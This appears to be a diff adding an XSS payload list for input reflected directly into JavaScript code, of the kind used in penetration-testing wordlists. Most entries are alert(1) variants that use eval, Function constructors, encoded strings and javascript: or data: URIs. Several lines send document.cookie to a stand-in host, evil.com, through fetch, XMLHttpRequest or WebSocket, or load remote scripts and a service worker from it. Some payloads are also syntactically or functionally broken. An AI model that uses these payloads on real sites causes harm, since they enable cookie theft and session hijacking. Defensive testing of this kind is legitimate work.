@@ -1,0 +1,305 @@
+# JavaScript Code Context XSS Payloads
+# These payloads work when input is reflected directly in JavaScript code (not in strings)
+
+# Direct execution
+alert(1)
+confirm(1)
+prompt(1)
+alert(document.domain)
+alert(document.cookie)
+alert(window.origin)
+
+# With semicolons
+;alert(1);
+;confirm(1);
+;prompt(1);
+;alert(document.domain);
+
+# Function calls
+window.alert(1)
+self.alert(1)
+top.alert(1)
+parent.alert(1)
+frames.alert(1)
+
+# Using this
+this.alert(1)
+this['alert'](1)
+
+# Global object access
+globalThis.alert(1)
+(function(){alert(1)})()
+
+# Constructor access
+[].constructor.constructor('alert(1)')()
+''.constructor.constructor('alert(1)')()
+(1).constructor.constructor('alert(1)')()
+
+# Using eval
+eval('alert(1)')
+eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+eval(atob('YWxlcnQoMSk='))
+
+# Using Function constructor
+Function('alert(1)')()
+new Function('alert(1)')()
+Function('alert','1')('document.domain')
+
+# setTimeout and setInterval
+setTimeout('alert(1)',0)
+setTimeout(alert,0,1)
+setInterval('alert(1)',0)
+setInterval(alert,0,1)
+
+# Using throw and onerror
+onerror=alert;throw 1
+window.onerror=alert;throw 1
+onerror=eval;throw'=alert\x281\x29'
+
+# Location manipulation
+location='javascript:alert(1)'
+location.href='javascript:alert(1)'
+location.assign('javascript:alert(1)')
+location.replace('javascript:alert(1)')
+
+# Document methods
+document.write('<img src=x onerror=alert(1)>')
+document.writeln('<img src=x onerror=alert(1)>')
+
+# DOM manipulation
+document.body.innerHTML='<img src=x onerror=alert(1)>'
+document.body.appendChild(document.createElement('img')).src='x';document.body.lastChild.onerror=alert(1)
+
+# Creating script elements
+document.body.appendChild(document.createElement('script')).src='//evil.com/xss.js'
+(d=document).body.appendChild(d.createElement('script')).innerHTML='alert(1)'
+
+# Using import
+import('data:text/javascript,alert(1)')
+import('//evil.com/xss.js')
+
+# Event handlers
+onclick=alert(1)
+onload=alert(1)
+onerror=alert(1)
+onmouseover=alert(1)
+
+# Using with statement
+with(document)alert(domain)
+with(window)alert(1)
+
+# Try-catch blocks
+try{alert(1)}catch(e){}
+try{throw 1}catch(e){alert(1)}
+
+# Logical operators
+alert(1)||1
+alert(1)&&1
+alert(1)|1
+alert(1)&1
+
+# Ternary operator
+1?alert(1):0
+true?alert(1):false
+
+# Comma operator
+1,alert(1),2
+alert(1),1
+
+# Void operator
+void alert(1)
+void(alert(1))
+
+# Delete operator
+delete window.x||alert(1)
+
+# Typeof
+typeof alert(1)
+
+# New operator
+new Function`alert\x281\x29```
+
+# Spread operator
+[...alert(1)]
+{...alert(1)}
+
+# Destructuring
+[x]=alert(1)
+{x}=alert(1)
+
+# Arrow functions
+x=>alert(1)
+()=>alert(1)
+(x=>alert(1))()
+(()=>alert(1))()
+
+# Generator functions
+function*x(){alert(1)}
+(function*(){alert(1)})().next()
+
+# Async functions
+async function x(){alert(1)}
+(async()=>alert(1))()
+
+# Classes
+class X{constructor(){alert(1)}}
+new X
+(class{constructor(){alert(1)}})()
+
+# Template literals
+`${alert(1)}`
+alert`1`
+String.raw`${alert(1)}`
+
+# Tagged templates
+alert`1`
+Function`a${'alert(1)'}```
+
+# Using Symbol
+Symbol.for('alert(1)')
+
+# Proxy traps
+new Proxy({},{get:()=>alert(1)}).x
+
+# Reflect API
+Reflect.get({x:alert(1)},'x')()
+Reflect.apply(alert,null,[1])
+
+# Object methods
+Object.assign(window,{x:alert(1)}).x()
+Object.defineProperty(window,'x',{get:alert(1)})
+
+# Array methods
+[alert(1)].map(x=>x())
+[alert][0](1)
+Array(alert(1))
+
+# String methods
+'alert(1)'.link('javascript:alert(1)')
+'x'.replace(/x/,alert(1))
+
+# Number methods
+(1).toString(36).replace(/1/,alert(1))
+
+# RegExp methods
+/x/.test(alert(1))
+/alert(1)/.source
+
+# Date methods
+Date.parse(alert(1))
+
+# JSON methods
+JSON.parse('{"x":"x"}',alert(1))
+
+# Promise
+Promise.resolve(alert(1))
+new Promise(alert)
+
+# For loops
+for(;alert(1););
+for(;;)alert(1)
+for(x in window)alert(1)
+for(x of[alert])x(1)
+
+# While loops
+while(alert(1));
+while(1)alert(1)
+
+# Do-while
+do alert(1);while(0)
+
+# Switch
+switch(alert(1)){default:}
+
+# Labels
+x:alert(1)
+
+# With comments
+/**/alert(1)
+//\nalert(1)
+
+# Mutation events
+document.body.addEventListener('DOMSubtreeModified',alert)
+document.body.dispatchEvent(new Event('DOMSubtreeModified'))
+
+# Message events
+addEventListener('message',alert)
+postMessage(1)
+
+# Hash change
+addEventListener('hashchange',alert)
+location.hash=1
+
+# Storage events
+addEventListener('storage',alert)
+localStorage.x=1
+
+# Unhandled rejection
+addEventListener('unhandledrejection',alert)
+Promise.reject(1)
+
+# Animation/Transition events
+addEventListener('animationstart',alert)
+addEventListener('transitionend',alert)
+
+# Using script protocol
+location='javascript:alert(1)'
+location='javascript:alert\x281\x29'
+location='javascript:alert\u00281\u0029'
+location='javascript:\u0061lert(1)'
+location='javascript:\x61lert(1)'
+
+# Data URI
+location='data:text/html,<script>alert(1)</script>'
+location='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
+
+# Using fetch
+fetch('//evil.com?'+document.cookie)
+fetch('javascript:alert(1)')
+
+# XMLHttpRequest
+(x=new XMLHttpRequest).open('GET','//evil.com?'+document.cookie);x.send()
+
+# WebSocket
+new WebSocket('wss://evil.com/?'+document.cookie)
+
+# Using crypto
+crypto.subtle.digest('SHA-256',new TextEncoder().encode(alert(1)))
+
+# Using service worker
+navigator.serviceWorker.register('//evil.com/sw.js')
+
+# Using web worker
+new Worker('data:,alert(1)')
+
+# Using shared worker
+new SharedWorker('data:,alert(1)')
+
+# History API
+history.pushState(1,1,'javascript:alert(1)')
+
+# Notification API
+Notification.requestPermission(alert)
+
+# Geolocation API
+navigator.geolocation.getCurrentPosition(alert)
+
+# Using iframe
+top.frames[0].eval('alert(1)')
+parent.frames[0].eval('alert(1)')
+
+# Cross-window access
+window.open().alert(1)
+open().alert(1)
+
+# Using name
+name='alert(1)';eval(name)
+
+# Using hash
+location.hash='#';eval(location.hash.slice(1)+'alert(1)')
+
+# Minimal variants
+alert(1)
+alert`1`
+eval('alert(1)')
+Function('alert(1)')()
